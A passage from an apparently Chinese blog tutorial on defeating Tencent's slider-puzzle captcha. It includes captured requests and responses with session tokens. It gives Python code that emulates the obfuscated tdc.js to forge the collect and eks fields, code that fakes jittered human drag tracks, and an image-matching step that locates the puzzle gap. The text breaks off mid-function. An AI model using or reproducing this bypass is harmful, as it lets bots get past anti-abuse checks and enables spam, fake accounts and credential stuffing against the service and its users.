[{"title":"腾讯滑块验证码","url":"/shizuku/055919.html","content":"\n# 腾讯行为验证码 滑块拼图验证\n\n## 抓包分析\n\n{% note info no-icon %}\n测试aid为 2000000008\n{% endnote %}\n\n![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/211325/2/42168/27434/664c5ec8F9a5a625d/54bb737d9e0f2009.jpg)\n\n请求了`https://t.captcha.qq.com GET方法`\n\nparms参数为\n\n```html\naid=2000000008&protocol=https&accver=1&showtype=full&ua=TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyBNT01PRSBCdWlsZC9US1ExLjIyMDgyOS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTExLjAuNTU2My4xMTYgTW9iaWxlIFNhZmFyaS81MzcuMzYgWFdFQi8xMTEwMDUzIE1NV0VCU0RLLzIwMjMxMTA1IE1NV0VCSUQvNTI3MyBNaWNyb01lc3Nlbmdlci84LjAuNDQuMjUwMigweDI4MDAyQzM3KSBXZUNoYXQvYXJtNjQgV2VpeGluIE5ldFR5cGUvV0lGSSBMYW5ndWFnZS96aF9DTiBBQkkvYXJtNjQ%3D&noheader=1&fb=1&aged=0&enableAged=0&enableDarkMode=0&grayscale=1&clientype=2&userLanguage=zh-cn&cap_cd=&uid=&wxLang=&lang=zh-cn&entry_url=&elder_captcha=0&js=%2Ftcaptcha-frame.921213.js&login_appid=&wb=1&subsid=1&callback=_aq_99695&sess=\n```\n\n拆开一条条看\n\n```html\naid=2000000008\nprotocol=https accver=1 showtype=full\nua=TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyBNT01PRSBCdWlsZC9US1ExLjIyMDgyOS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTExLjAuNTU2My4xMTYgTW9iaWxlIFNhZmFyaS81MzcuMzYgWFdFQi8xMTEwMDUzIE1NV0VCU0RLLzIwMjMxMTA1IE1NV0VCSUQvNTI3MyBNaWNyb01lc3Nlbmdlci84LjAuNDQuMjUwMigweDI4MDAyQzM3KSBXZUNoYXQvYXJtNjQgV2VpeGluIE5ldFR5cGUvV0lGSSBMYW5ndWFnZS96aF9DTiBBQkkvYXJtNjQ=\nnoheader=1 fb=1 aged=0 enableAged=0 enableDarkMode=0\ngrayscale=1&clientype=2&userLanguage=zh-cn cap_cd= uid= wxLang=&lang=zh-cn\nentry_url= elder_captcha=0 js=/tcaptchaframe.921213.js\nlogin_appid= wb=1 subsid=1 callback=_aq_99695 sess=\n```\n\n有三个关键参数 分别是aid ua callback\n\nua为base64后的 callback决定了返回的json起始值\n\n返回值\n\n```json\n_aq_99695({\"state\":1,\"ticket\":\"\",\"capclass\":\"1\",\"subcapclass\":\"10144\",\"src_1\":\"cap_union_new_show\",\"src_2\":\"template/new_placeholder.html\",\"src_3\":\"template/new_slide_placeholder.html\",\"sess\":\"s0XdZ2kavzZ4lMrQ4uwCfaXhEbuMZNR2MsyBPJmeK4mVInREcH1vqyhSe7G6MlWm-fTKVGCdkqkf3jEmZXaOMnELsMWZj9sgB5lexBUxzPD08ERn-Z3pxYIgBcxXvbds63HGgnY9HBQaI2hB3L5HYHdcwqM1Rwy4HBGElODCyNfcYXmJoqXO2aal0lW3-P3JTgy0yay97hg2tyNVSSlmVJft--TJdt2pquRgRgjg-dP3wj1tCyp7Rv-aNVcOcOfBsdiF58Uo3vDppW4ntaagLkR3fvcKynqh_jCnKswt892qqqAl03wq7-9mJFprEu3hdehv3gfitjm6VIuPsulX9lq658W6yS4H0oB-xMXDqJU2p7EYddI2mVgnZxrC3VBSyaosj5Cng5eSrhtBILTLTBIWKGXpPokIYStV-EMjLJiVE*\",\"randstr\":\"\",\"sid\":\"7198604069692559360\",\"log_js\":\"\",\"extra\":\"{\\\"rainbow\\\":\\\"{\\\\n  \\\\\\\"samplingRate\\\\\\\":0.1,\\\\n  \\\\\\\"apiReportThrottle\\\\\\\":200,\\\\n  \\\\\\\"sourceReportThrottle\\\\\\\":300,\\\\n  \\\\\\\"loadReportThrottle\\\\\\\":1000,\\\\n  \\\\\\\"sampleAppidList\\\\\\\":[\\\\\\\"2053860784\\\\\\\",\\\\\\\"2091569087\\\\\\\"]\\\\n}\\\"}\",\"data\":{\"comm_captcha_cfg\":{\"tdc_path\":\"/tdc.js?app_data=7198604069692559360&t=1213916534\",\"feedback_url\":\"https://support.qq.com/products/304457\",\"pow_cfg\":{\"prefix\":\"2c4eae921213dcf2#\",\"md5\":\"ef7d702689e9682a8a6f93b695c6383b\"}},\"dyn_show_info\":{\"lang\":\"zh-cn\",\"instruction\":\"拖动下方滑块完成拼图\",\"bg_elem_cfg\":{\"sprite_pos\":[0,0],\"size_2d\":[672,480],\"img_url\":\"/cap_union_new_getcapbysig?img_index=1&image=02a027000000001a0000001eb7f57e512fc3&sess=s0S6ZReNGNUQ43mWmkryTKQ-GtePsp7eN7mZyFCs7Vu2_IwXtvWdMKhUTZJDs71_GuUZiO_4zCcQ-N4FcqIvY4mEOPRNIyyuaUuB7Qilkem_02OF5uRqtXakeQteZuF0VcmxW177S1Sa1XrHPKdR3xaHwdAnNKrqqoE46B3roBjidIYCdEeOp18snNq4bpz_B405I6acSRC7SSOBzFC0xQAOIMiZhQHsnY8h67lLuEbesyJCjzPfVyahFwTsQiR2K98OisU5xWDf73uc0QEgBcBEfYky8P3FLbfFPxttlFPNYsqdWHM02ibttaVaRIn_30wyKOLeYSRqagkZkK8BxE-twNQUY36xgYyeJ3ZR6QUs87YMvO8cSydJRURGBcVffG5IsmgCw3erjF64ap_3CeXLx4trYeZqt9xFDXj3bI-Bo*\"},\"fg_elem_list\":[{\"id\":3,\"sprite_pos\":[0,422],\"size_2d\":[672,32],\"init_pos\":[0,422]},{\"id\":1,\"sprite_pos\":[140,490],\"size_2d\":[120,120],\"init_pos\":[50,109],\"move_cfg\":{\"track_limit\":\"x>=50&&x<=552\",\"move_factor\":[1,0],\"data_type\":[\"DynAnswerType_POS\"]}},{\"id\":2,\"sprite_pos\":[0,490],\"size_2d\":[130,70],\"init_pos\":[45,402],\"move_cfg\":{\"track_limit\":\"x>=50&&x<=552\",\"move_factor\":[1,0]},\"type\":\"slider\"}],\"fg_binding_list\":[{\"master\":1,\"slave\":2,\"bind_type\":\"DynBindType_DX_DX\",\"bind_factor\":1},{\"master\":2,\"slave\":1,\"bind_type\":\"DynBindType_DX_DX\",\"bind_factor\":1}],\"sprite_url\":\"/cap_union_new_getcapbysig?img_index=0&image=02a027000000001a0000001eb7f57e512fc3&sess=s0S6ZReNGNUQ43mWmkryTKQ-GtePsp7eN7mZyFCs7Vu2_IwXtvWdMKhUTZJDs71_GuUZiO_4zCcQ-N4FcqIvY4mEOPRNIyyuaUuB7Qilkem_02OF5uRqtXakeQteZuF0VcmxW177S1Sa1XrHPKdR3xaHwdAnNKrqqoE46B3roBjidIYCdEeOp18snNq4bpz_B405I6acSRC7SSOBzFC0xQAOIMiZhQHsnY8h67lLuEbesyJCjzPfVyahFwTsQiR2K98OisU5xWDf73uc0QEgBcBEfYky8P3FLbfFPxttlFPNYsqdWHM02ibttaVaRIn_30wyKOLeYSRqagkZkK8BxE-twNQUY36xgYyeJ3ZR6QUs87YMvO8cSydJRURGBcVffG5IsmgCw3erjF64ap_3CeXLx4trYeZqt9xFDXj3bI-Bo*\",\"color_scheme\":\"#26C067\"}},\"uip\":\"11.4.5.14\"})\n```\n\n去掉_aq开头进行格式化\n\n```json\n{\n  \"state\": 1,\n  \"ticket\": \"\",\n  \"capclass\": \"1\",\n  \"subcapclass\": \"10144\",\n  \"src_1\": \"cap_union_new_show\",\n  \"src_2\": \"template/new_placeholder.html\",\n  \"src_3\": \"template/new_slide_placeholder.html\",\n  \"sess\": \"s0XdZ2kavzZ4lMrQ4uwCfaXhEbuMZNR2MsyBPJmeK4mVInREcH1vqyhSe7G6MlWm-fTKVGCdkqkf3jEmZXaOMnELsMWZj9sgB5lexBUxzPD08ERn-Z3pxYIgBcxXvbds63HGgnY9HBQaI2hB3L5HYHdcwqM1Rwy4HBGElODCyNfcYXmJoqXO2aal0lW3-P3JTgy0yay97hg2tyNVSSlmVJft--TJdt2pquRgRgjg-dP3wj1tCyp7Rv-aNVcOcOfBsdiF58Uo3vDppW4ntaagLkR3fvcKynqh_jCnKswt892qqqAl03wq7-9mJFprEu3hdehv3gfitjm6VIuPsulX9lq658W6yS4H0oB-xMXDqJU2p7EYddI2mVgnZxrC3VBSyaosj5Cng5eSrhtBILTLTBIWKGXpPokIYStV-EMjLJiVE*\",\n  \"randstr\": \"\",\n  \"sid\": \"7198604069692559360\",\n  \"log_js\": \"\",\n  \"extra\": \"{\\\"rainbow\\\":\\\"{\\\\n  \\\\\\\"samplingRate\\\\\\\":0.1,\\\\n  \\\\\\\"apiReportThrottle\\\\\\\":200,\\\\n  \\\\\\\"sourceReportThrottle\\\\\\\":300,\\\\n  \\\\\\\"loadReportThrottle\\\\\\\":1000,\\\\n  \\\\\\\"sampleAppidList\\\\\\\":[\\\\\\\"2053860784\\\\\\\",\\\\\\\"2091569087\\\\\\\"]\\\\n}\\\"}\",\n  \"data\": {\n    \"comm_captcha_cfg\": {\n      \"tdc_path\": \"/tdc.js?app_data=7198604069692559360&t=1213916534\",\n      \"feedback_url\": \"https://support.qq.com/products/304457\",\n      \"pow_cfg\": {\n        \"prefix\": \"2c4eae921213dcf2#\",\n        \"md5\": \"ef7d702689e9682a8a6f93b695c6383b\"\n      }\n    },\n    \"dyn_show_info\": {\n      \"lang\": \"zh-cn\",\n      \"instruction\": \"拖动下方滑块完成拼图\",\n      \"bg_elem_cfg\": {\n        \"sprite_pos\": [0, 0],\n        \"size_2d\": [672, 480],\n        \"img_url\": \"/cap_union_new_getcapbysig?img_index=1&image=02a027000000001a0000001eb7f57e512fc3&sess=s0S6ZReNGNUQ43mWmkryTKQ-GtePsp7eN7mZyFCs7Vu2_IwXtvWdMKhUTZJDs71_GuUZiO_4zCcQ-N4FcqIvY4mEOPRNIyyuaUuB7Qilkem_02OF5uRqtXakeQteZuF0VcmxW177S1Sa1XrHPKdR3xaHwdAnNKrqqoE46B3roBjidIYCdEeOp18snNq4bpz_B405I6acSRC7SSOBzFC0xQAOIMiZhQHsnY8h67lLuEbesyJCjzPfVyahFwTsQiR2K98OisU5xWDf73uc0QEgBcBEfYky8P3FLbfFPxttlFPNYsqdWHM02ibttaVaRIn_30wyKOLeYSRqagkZkK8BxE-twNQUY36xgYyeJ3ZR6QUs87YMvO8cSydJRURGBcVffG5IsmgCw3erjF64ap_3CeXLx4trYeZqt9xFDXj3bI-Bo*\"\n      },\n      \"fg_elem_list\": [\n        {\n          \"id\": 3,\n          \"sprite_pos\": [0, 422],\n          \"size_2d\": [672, 32],\n          \"init_pos\": [0, 422]\n        },\n        {\n          \"id\": 1,\n          \"sprite_pos\": [140, 490],\n          \"size_2d\": [120, 120],\n          \"init_pos\": [50, 109],\n          \"move_cfg\": {\n            \"track_limit\": \"x>=50&&x<=552\",\n            \"move_factor\": [1, 0],\n            \"data_type\": [\"DynAnswerType_POS\"]\n          }\n        },\n        {\n          \"id\": 2,\n          \"sprite_pos\": [0, 490],\n          \"size_2d\": [130, 70],\n          \"init_pos\": [45, 402],\n          \"move_cfg\": { \"track_limit\": \"x>=50&&x<=552\", \"move_factor\": [1, 0] },\n          \"type\": \"slider\"\n        }\n      ],\n      \"fg_binding_list\": [\n        {\n          \"master\": 1,\n          \"slave\": 2,\n          \"bind_type\": \"DynBindType_DX_DX\",\n          \"bind_factor\": 1\n        },\n        {\n          \"master\": 2,\n          \"slave\": 1,\n          \"bind_type\": \"DynBindType_DX_DX\",\n          \"bind_factor\": 1\n        }\n      ],\n      \"sprite_url\": \"/cap_union_new_getcapbysig?img_index=0&image=02a027000000001a0000001eb7f57e512fc3&sess=s0S6ZReNGNUQ43mWmkryTKQ-GtePsp7eN7mZyFCs7Vu2_IwXtvWdMKhUTZJDs71_GuUZiO_4zCcQ-N4FcqIvY4mEOPRNIyyuaUuB7Qilkem_02OF5uRqtXakeQteZuF0VcmxW177S1Sa1XrHPKdR3xaHwdAnNKrqqoE46B3roBjidIYCdEeOp18snNq4bpz_B405I6acSRC7SSOBzFC0xQAOIMiZhQHsnY8h67lLuEbesyJCjzPfVyahFwTsQiR2K98OisU5xWDf73uc0QEgBcBEfYky8P3FLbfFPxttlFPNYsqdWHM02ibttaVaRIn_30wyKOLeYSRqagkZkK8BxE-twNQUY36xgYyeJ3ZR6QUs87YMvO8cSydJRURGBcVffG5IsmgCw3erjF64ap_3CeXLx4trYeZqt9xFDXj3bI-Bo*\",\n      \"color_scheme\": \"#26C067\"\n    }\n  },\n  \"uip\": \"11.4.5.14\"\n}\n\n```\n\n需要注意的参数为\n\n```json\n\"tdc_path\": \"/tdc.js?app_data=7198604069692559360&t=1213916534\"\n\n\"pow_cfg\": {\n    \"prefix\": \"2c4eae921213dcf2#\",\n    \"md5\": \"ef7d702689e9682a8a6f93b695c6383b\"\n }\n \n\"img_url\": \"/cap_union_new_getcapbysig?img_index=1&image=02a027000000001a0000001eb7f57e512fc3&sess=s0S6ZReNGNUQ43mWmkryTKQ-GtePsp7eN7mZyFCs7Vu2_IwXtvWdMKhUTZJDs71_GuUZiO_4zCcQ-N4FcqIvY4mEOPRNIyyuaUuB7Qilkem_02OF5uRqtXakeQteZuF0VcmxW177S1Sa1XrHPKdR3xaHwdAnNKrqqoE46B3roBjidIYCdEeOp18snNq4bpz_B405I6acSRC7SSOBzFC0xQAOIMiZhQHsnY8h67lLuEbesyJCjzPfVyahFwTsQiR2K98OisU5xWDf73uc0QEgBcBEfYky8P3FLbfFPxttlFPNYsqdWHM02ibttaVaRIn_30wyKOLeYSRqagkZkK8BxE-twNQUY36xgYyeJ3ZR6QUs87YMvO8cSydJRURGBcVffG5IsmgCw3erjF64ap_3CeXLx4trYeZqt9xFDXj3bI-Bo*\"\n\n\"sprite_url\": \"/cap_union_new_getcapbysig?img_index=0&image=02a027000000001a0000001eb7f57e512fc3&sess=s0S6ZReNGNUQ43mWmkryTKQ-GtePsp7eN7mZyFCs7Vu2_IwXtvWdMKhUTZJDs71_GuUZiO_4zCcQ-N4FcqIvY4mEOPRNIyyuaUuB7Qilkem_02OF5uRqtXakeQteZuF0VcmxW177S1Sa1XrHPKdR3xaHwdAnNKrqqoE46B3roBjidIYCdEeOp18snNq4bpz_B405I6acSRC7SSOBzFC0xQAOIMiZhQHsnY8h67lLuEbesyJCjzPfVyahFwTsQiR2K98OisU5xWDf73uc0QEgBcBEfYky8P3FLbfFPxttlFPNYsqdWHM02ibttaVaRIn_30wyKOLeYSRqagkZkK8BxE-twNQUY36xgYyeJ3ZR6QUs87YMvO8cSydJRURGBcVffG5IsmgCw3erjF64ap_3CeXLx4trYeZqt9xFDXj3bI-Bo*\"\n\n\"sess\": \"s0XdZ2kavzZ4lMrQ4uwCfaXhEbuMZNR2MsyBPJmeK4mVInREcH1vqyhSe7G6MlWm-fTKVGCdkqkf3jEmZXaOMnELsMWZj9sgB5lexBUxzPD08ERn-Z3pxYIgBcxXvbds63HGgnY9HBQaI2hB3L5HYHdcwqM1Rwy4HBGElODCyNfcYXmJoqXO2aal0lW3-P3JTgy0yay97hg2tyNVSSlmVJft--TJdt2pquRgRgjg-dP3wj1tCyp7Rv-aNVcOcOfBsdiF58Uo3vDppW4ntaagLkR3fvcKynqh_jCnKswt892qqqAl03wq7-9mJFprEu3hdehv3gfitjm6VIuPsulX9lq658W6yS4H0oB-xMXDqJU2p7EYddI2mVgnZxrC3VBSyaosj5Cng5eSrhtBILTLTBIWKGXpPokIYStV-EMjLJiVE*\"\n```\n\nimg_url与sprite_url分别代表背景图和缺口图\n\n![cap_union_new_getcapbysig.png](https://img12.360buyimg.com/ddimg/jfs/t1/245299/24/9110/5048/664c632cFa0eb54e6/144a52bef6ae134c.jpg)\n![cap_union_new_getcapbysig2.png](https://img10.360buyimg.com/ddimg/jfs/t1/192878/31/45077/61614/664c632cF27873e56/81bf913ea6630529.jpg)\n\n最终提交验证的地址为 `https://t.captcha.qq.com/cap_union_new_verify`\n\n提交的参数格式为form-data\n\n```html\ncollect=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&tlg=3416&eks=KT0GxYUSVeYeeXHunYofyH3jHR7V3YVvp0/XHzAUjMC92n1V5230gK6MxAaCp2fYMHpWsYx/WeiR1S6sO1UBL3NofUZfsO8CQqoAQNy2WyUTeiKpyBk0ZeXM2JI8FX+N0xk5Rr70QiWX6zKyq8P8S0yoQMSZFf14YZQGw68dzXnryUtFbB3l3uW/XUjrYctEqThF2x7UOzqbDALD1nBeqsxE8U84XKJ8lR6syYdd/pI=&sess=s0XdZ2kavzZ4lMrQ4uwCfaXhEbuMZNR2MsyBPJmeK4mVInREcH1vqyhSe7G6MlWm-fTKVGCdkqkf3jEmZXaOMnELsMWZj9sgB5lexBUxzPD08ERn-Z3pxYIgBcxXvbds63HGgnY9HBQaI2hB3L5HYHdcwqM1Rwy4HBGElODCyNfcYXmJoqXO2aal0lW3-P3JTgy0yay97hg2tyNVSSlmVJft--TJdt2pquRgRgjg-dP3wj1tCyp7Rv-aNVcOcOfBsdiF58Uo3vDppW4ntaagLkR3fvcKynqh_jCnKswt892qqqAl03wq7-9mJFprEu3hdehv3gfitjm6VIuPsulX9lq658W6yS4H0oB-xMXDqJU2p7EYddI2mVgnZxrC3VBSyaosj5Cng5eSrhtBILTLTBIWKGXpPokIYStV-EMjLJiVE*&ans=[{\"elem_id\":1,\"type\":\"DynAnswerType_POS\",\"data\":\"465,109\"}]&pow_answer=2c4eae921213dcf2#290&pow_calc_time=50\n```\n\n## 参数分析\n\n参数有点多 精简一下看重点\n\n```html\ncollect=\ntlg=3416 // tlg为collect的长度\neks=\nsess=  //为第一次请求获得的sess参数\nans=[{\"elem_id\":1,\"type\":\"DynAnswerType_POS\",\"data\":\"465,109\"}]\npow_answer=2c4eae921213dcf2#290&pow_calc_time=50\n```\n\n其中collect与eks为tdc.js计算得到 collect为getData参数 eks为getInfo参数\n\n提交验证无误后服务器会返回\n\n```json\n{\n  \"errorCode\": \"0\",\n  \"randstr\": \"@IFs\",\n  \"ticket\": \"t03tc7qmJ5J7hv1nKoMXqlqWBy3rNdOlapvSugmPWgQc9Mq_pRbuc8nOThAB2zVX5S6omlbjqFw9HJ9HBdl4ABQ30Yqy81dBUenH8qGTIVt-Ky95644-h-gbzhsz8ECCczh8iFjcuYeL7gzlWqER1p7b1wQs9o4ESs3peLX7DHNytLwpUti_l-pRB_tyBdXmPJq\",\n  \"errMessage\": \"\",\n  \"sess\": \"\"\n}\n```\n\n所需要的参数randstr ticket\n\n------\n\ntds使用腾讯自家的`TENCENT_CHAOS_VM`技术 这部分可以参考下面链接\n\n> 分析参考: \n> **Zhihu:** https://zhuanlan.zhihu.com/p/621903162\n> **JamzumSum:** https://zzsblog.top/tcaptcha.html\n\n## 模拟计算\n\n这里咱们使用Python ChaosVM Executor 来模拟执行tdc.js获取collect与eks参数\n\n> 项目地址: https://github.com/aioqzone/pychaosvm\n\n```python\n//参考代码 注释由Ai生成 \ndef ChaosVM_Exm(vmjs, uip: str, mouse_track) -> tuple:\n    \"\"\"\n    与ChaosVM交互的函数，通过给定的虚拟机JavaScript代码、用户IP地址和鼠标追踪信息，来获取数据。\n\n    参数:\n    - vmjs: 虚拟机的JavaScript代码，用于在ChaosVM环境中执行。\n    - uip: 用户的IP地址，作为与ChaosVM交互的一部分。\n    - mouse_track: 鼠标追踪信息，包含用户的鼠标活动数据。\n\n    返回值:\n    - 返回一个元组，包含collect, eks。\n    \"\"\"\n    # 构造用户代理和准备与ChaosVM交互的环境\n    ua = user_agent\n    tdc = prepare(js_vm=vmjs, ip=uip, ua=ua, mouse_track=mouse_track)\n    \n    # 获取ChaosVM的信息\n    info = tdc.getInfo(None)\n    # 确保info不为空，并且info中的\"info\"键对应的值可以被转换为字符串\n    assert info.__dict__\n    assert str(info[\"info\"])\n    \n    # 处理info中的\"info\"键对应的字符串，移除单引号\n    eks = str(info[\"info\"]).replace(\"'\", \"\")\n    \n    # 从ChaosVM收集数据，并进行URL解码\n    collect = tdc.getData(None, True)\n    collect = unquote(collect)\n    \n    # 确保收集到的数据满足特定的长度要求，并且不包含\"chaosvm\"字符串\n    assert len(collect) > 4\n    assert \"chaosvm\" not in collect\n\n    return collect, eks\n```\n\n鼠标轨迹算法参考\n\n```python\ndef imitate_drago(x1: int, x2: int, y: int) -> t.Tuple[t.List[int], t.List[int]]:\n    \"\"\"\n    模拟拖拽动作产生的x和y方向上的抖动效果。\n    \n    参数:\n    x1: int - 拖拽开始点的x坐标，必须位于(0, x2)之间。\n    x2: int - 拖拽结束点的x坐标，必须位于(x1, +∞)之间。\n    y: int - 拖拽过程中垂直方向上的固定值，表示在y轴上没有移动。\n    \n    返回值:\n    t.Tuple[t.List[int], t.List[int]]: 一个元组，包含两个列表。\n        第一个列表表示x轴上的抖动路径，第二个列表表示y轴上的抖动路径。\n    \"\"\"\n\n    # 确保x1位于(0, x2)之间，y大于0\n    assert 0 < x1 < x2, (x1, x2)\n    assert 0 < y, y\n\n    # 随机生成抖动点的数量在50到64之间\n    n = randint(50, 64)\n    # 生成y轴上的随机抖动值，主要集中在y值附近\n    noise_y = choices([y - 1, y + 1, y], [0.1, 0.1, 0.8], k=n)\n\n    # 根据抖动点数量，确定x轴上的抖动范围\n    if n >= 51:\n        noise_x = [0]  # 起始抖动点固定为0\n        noise_x += choices(list(range(-3, 4)), k=max(n - 51, 0))  # 补充长尾抖动\n    else:\n        noise_x = []  # 如果点数少于51，则不添加长尾抖动\n\n    # 添加中间区域的抖动\n    noise_x += choices(list(range(-2, 3)), k=30)\n    noise_x += choices(list(range(-1, 2)), k=19)\n    noise_x.append(0)  # 结尾抖动点固定为0\n\n    # 计算x轴上各点的均匀分布，再进行随机抖动\n    d, lsv = (x1 - x2) / (n - 1), x1\n    for i in range(n):\n        noise_x[i] += round(lsv)\n        lsv += d\n    noise_x.sort()  # 确保x轴上的点按顺序排列\n    return noise_x, noise_y\n```\n\n------\n\n现在解决了collect和eks 来看后面的ans 可以看到ans的DynAnswerType_POS就是滑块正确位置\n\nX坐标465 Y坐标109 滑块的Y坐标为固定 可以从`\"init_pos\": [50, 109]`提取Y坐标\n\n这里再介绍一个Python库 DdddOcr  带带弟弟OCR通用验证码识别\n\n> 项目地址: https://github.com/sml2h3/ddddocr\n\n```python\nDemo代码\n\nslide = ddddocr.DdddOcr(det=False, ocr=False)\n\nwith open('target.jpg', 'rb') as f:\n     target_bytes = f.read()\nwith open('background.jpg', 'rb') as f:\n     background_bytes = f.read()\n       \nres = slide.slide_match(target_bytes, background_bytes, simple_target=True)\n    \nprint(res)\n```\n\n传入背景图与缺口图即可识别坐标 但是因为缺口图有边框透明背景 识别率并不是很满意\n\n这里加入一些图像操作 对缺口图进行暴力裁切以符合匹配条件\n\n```python\ndef cropmatch_imagem(reference_image: bytes, target_image: bytes) -> int:\n    \"\"\"\n    :param reference_image: 参考图像的字节串\n    :param target_image: 目标图像的字节串\n    :return: 匹配结果的目标索引\n    \"\"\"\n\n    # 加载目标图像\n  